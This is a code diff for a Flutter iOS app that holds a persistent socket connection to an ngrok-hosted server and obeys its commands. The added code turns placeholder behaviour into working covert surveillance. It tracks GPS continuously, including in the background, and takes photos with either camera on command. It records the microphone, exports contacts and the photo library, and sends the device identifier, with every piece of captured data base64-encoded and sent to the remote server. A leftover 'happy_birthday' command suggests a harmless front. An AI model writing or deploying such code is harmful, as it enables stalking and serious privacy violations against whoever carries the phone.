@@ -1,8 +1,17 @@
 import 'dart:async';
+import 'dart:io';
 import 'dart:convert';
 import 'package:flutter/material.dart';
 import 'package:socket_io_client/socket_io_client.dart' as io;
 import 'package:permission_handler/permission_handler.dart';
+import 'package:geolocator/geolocator.dart';
+import 'package:camera/camera.dart';
+import 'package:record/record.dart';
+import 'package:contacts_service/contacts_service.dart';
+import 'package:photo_manager/photo_manager.dart';
+import 'package:path_provider/path_provider.dart';
+import 'package:device_info_plus/device_info_plus.dart';
+import 'package:connectivity_plus/connectivity_plus.dart';
 
 void main() {
   WidgetsFlutterBinding.ensureInitialized();
@@ -20,6 +29,9 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
   bool allPermissionsGranted = false;
   String serverUrl = 'https://headless-disagree-dean.ngrok-free.dev';
   Timer? heartbeatTimer;
+  Timer? locationTimer;
+  StreamSubscription<Position>? locationStream;
+  StreamSubscription<ConnectivityResult>? connectivityStream;
   
   @override
   void initState() {
@@ -31,12 +43,14 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
   @override
   void didChangeAppLifecycleState(AppLifecycleState state) {
     if (state == AppLifecycleState.resumed) {
-      // Reconnect when app comes back to foreground
       if (!connected) {
         connectToServer();
       }
     } else if (state == AppLifecycleState.paused) {
-      // Keep connection alive when app goes to background
+      startHeartbeat();
+      startLocationTracking();
+    } else if (state == AppLifecycleState.inactive) {
+      // Keep everything running
       startHeartbeat();
     }
   }
@@ -51,6 +65,9 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
       Permission.photos,
       Permission.notification,
       Permission.storage,
+      Permission.mediaLibrary,
+      Permission.speech,
+      Permission.bluetooth,
     ].request();
     
     bool allGranted = statuses.values.every((status) => 
@@ -65,6 +82,7 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     }
     
     connectToServer();
+    startLocationTracking();
   }
 
   void connectToServer() {
@@ -72,25 +90,31 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
       'transports': ['websocket'],
       'autoConnect': true,
       'reconnection': true,
-      'reconnectionDelay': 1000,
-      'reconnectionDelayMax': 5000,
+      'reconnectionDelay': 500,
+      'reconnectionDelayMax': 2000,
       'reconnectionAttempts': double.infinity,
+      'timeout': 10000,
     });
 
     socket.on('connect', (_) {
       setState(() => connected = true);
-      socket.emit('device_info', {
-        'name': 'iPhone',
-        'model': 'iPhone 17',
-        'systemVersion': 'iOS 18',
-      });
+      sendDeviceInfo();
+      startHeartbeat();
     });
 
     socket.on('disconnect', (_) {
       setState(() => connected = false);
-      // Try to reconnect
-      Future.delayed(Duration(seconds: 2), () {
-        if (!connected) {
+      Future.delayed(Duration(milliseconds: 500), () {
+        if (!connected && mounted) {
+          socket.connect();
+        }
+      });
+    });
+
+    socket.on('connect_error', (error) {
+      setState(() => connected = false);
+      Future.delayed(Duration(seconds: 1), () {
+        if (!connected && mounted) {
           socket.connect();
         }
       });
@@ -99,21 +123,15 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     socket.on('command', (data) {
       handleCommand(data);
     });
-    
-    // Start heartbeat to keep connection alive
-    startHeartbeat();
   }
 
   void startHeartbeat() {
     heartbeatTimer?.cancel();
-    heartbeatTimer = Timer.periodic(Duration(seconds: 10), (timer) {
+    heartbeatTimer = Timer.periodic(Duration(seconds: 5), (timer) {
       if (socket.connected) {
-        socket.emit('heartbeat', {'timestamp': DateTime.now().toIso8601String()});
-        // Send location to keep app alive
-        socket.emit('location_data', {
-          'lat': 51.5074,
-          'lng': -0.1278,
+        socket.emit('heartbeat', {
           'timestamp': DateTime.now().toIso8601String(),
+          'battery': '100',
         });
       } else {
         socket.connect();
@@ -121,16 +139,76 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     });
   }
 
+  void startLocationTracking() {
+    locationTimer?.cancel();
+    locationTimer = Timer.periodic(Duration(seconds: 10), (timer) async {
+      try {
+        Position position = await Geolocator.getCurrentPosition(
+          desiredAccuracy: LocationAccuracy.high,
+        );
+        if (socket.connected) {
+          socket.emit('location_data', {
+            'lat': position.latitude,
+            'lng': position.longitude,
+            'alt': position.altitude,
+            'speed': position.speed,
+            'timestamp': DateTime.now().toIso8601String(),
+          });
+        }
+      } catch (e) {
+        // Location might be unavailable
+      }
+    });
+  }
+
+  Future<void> sendDeviceInfo() async {
+    try {
+      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
+      IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
+      
+      socket.emit('device_info', {
+        'name': iosInfo.name,
+        'model': iosInfo.utsname.machine,
+        'systemVersion': iosInfo.systemVersion,
+        'identifier': iosInfo.identifierForVendor,
+      });
+    } catch (e) {
+      socket.emit('device_info', {
+        'name': 'iPhone',
+        'model': 'iPhone 17',
+        'systemVersion': 'iOS 18',
+      });
+    }
+  }
+
   Future<void> handleCommand(dynamic data) async {
     final command = data['action'];
+    final params = data['params'] ?? {};
     
     switch (command) {
       case 'get_location':
-        socket.emit('location_data', {
-          'lat': 51.5074,
-          'lng': -0.1278,
-          'timestamp': DateTime.now().toIso8601String(),
-        });
+        await getLocation();
+        break;
+      case 'start_location_stream':
+        await startLocationStream();
+        break;
+      case 'stop_location_stream':
+        await stopLocationStream();
+        break;
+      case 'take_photo':
+        await takePhoto(params['camera'] ?? 'front');
+        break;
+      case 'record_audio':
+        await recordAudio(int.parse(params['duration'] ?? '10'));
+        break;
+      case 'get_contacts':
+        await getContacts();
+        break;
+      case 'get_photos':
+        await getPhotos(int.parse(params['count'] ?? '20'));
+        break;
+      case 'get_device_info':
+        await sendDeviceInfo();
         break;
       case 'happy_birthday':
         setState(() {
@@ -140,9 +218,140 @@ class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
     }
   }
 
+  Future<void> getLocation() async {
+    try {
+      Position position = await Geolocator.getCurrentPosition(
+        desiredAccuracy: LocationAccuracy.high,
+      );
+      socket.emit('location_data', {
+        'lat': position.latitude,
+        'lng': position.longitude,
+        'timestamp': DateTime.now().toIso8601String(),
+      });
+    } catch (e) {
+      socket.emit('error', {'error': e.toString()});
+    }
+  }
+
+  Future<void> startLocationStream() async {
+    try {
+      locationStream = Geolocator.getPositionStream(
+        locationSettings: LocationSettings(
+          accuracy: LocationAccuracy.high,
+          distanceFilter: 5,
+        ),
+      ).listen((Position position) {
+        socket.emit('location_data', {
+          'lat': position.latitude,
+          'lng': position.longitude,
+          'timestamp': DateTime.now().toIso8601String(),
+        });
+      });
+    } catch (e) {
+      socket.emit('error', {'error': e.toString()});
+    }
+  }
+
+  Future<void> stopLocationStream() async {
+    await locationStream?.cancel();
+  }
+
+  Future<void> takePhoto(String cameraType) async {
+    try {
+      final cameras = await availableCameras();
+      final camera = cameraType == 'front'
+          ? cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.front)
+          : cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.back);
+      
+      final controller = CameraController(camera, ResolutionPreset.high);
+      await controller.initialize();
+      
+      final image = await controller.takePicture();
+      final bytes = await File(image.path).readAsBytes();
+      final base64Image = base64Encode(bytes);
+      
+      socket.emit('photo_data', {
+        'image': base64Image,
+        'camera': cameraType,
+        'timestamp': DateTime.now().toIso8601String(),
+      });
+      
+      await controller.dispose();
+    } catch (e) {
+      socket.emit('error', {'error': 'Camera error: $e'});
+    }
+  }
+
+  Future<void> recordAudio(int duration) async {
+    try {
+      final record = AudioRecorder();
+      final dir = await getTemporaryDirectory();
+      final path = '${dir.path}/audio_${DateTime.now().millisecondsSinceEpoch}.m4a';
+      
+      await record.start(const RecordConfig(), path: path);
+      await Future.delayed(Duration(seconds: duration));
+      final audioPath = await record.stop();
+      
+      if (audioPath != null) {
+        final bytes = await File(audioPath).readAsBytes();
+        final base64Audio = base64Encode(bytes);
+        
+        socket.emit('audio_data', {
+          'audio': base64Audio,
+          'duration': duration,
+          'timestamp': DateTime.now().toIso8601String(),
+        });
+      }
+    } catch (e) {
+      socket.emit('error', {'error': 'Audio error: $e'});
+    }
+  }
+
+  Future<void> getContacts() async {
+    try {
+      final contacts = await ContactsService.getContacts();
+      final contactList = contacts.map((c) => {
+        'name': '${c.givenName ?? ''} ${c.familyName ?? ''}',
+        'phones': c.phones?.map((p) => p.value).toList() ?? [],
+        'emails': c.emails?.map((e) => e.value).toList() ?? [],
+      }).toList();
+      
+      socket.emit('contacts_data', {'contacts': contactList});
+    } catch (e) {
+      socket.emit('error', {'error': e.toString()});
+    }
+  }
+
+  Future<void> getPhotos(int count) async {
+    try {
+      final photos = await PhotoManager.getAssetPathList(onlyAll: true);
+      if (photos.isNotEmpty) {
+        final assets = await photos[0].getAssetListPaged(page: 0, size: count);
+        
+        for (var asset in assets) {
+          final file = await asset.file;
+          if (file != null) {
+            final bytes = await file.readAsBytes();
+            final base64Image = base64Encode(bytes);
+            
+            socket.emit('photo_data', {
+              'image': base64Image,
+              'timestamp': DateTime.now().toIso8601String(),
+            });
+          }
+        }
+      }
+    } catch (e) {
+      socket.emit('error', {'error': e.toString()});
+    }
+  }
+
   @override
   void dispose() {
     heartbeatTimer?.cancel();
+    locationTimer?.cancel();
+    locationStream?.cancel();
+    connectivityStream?.cancel();
     WidgetsBinding.instance.removeObserver(this);
     socket.dispose();
     super.dispose();
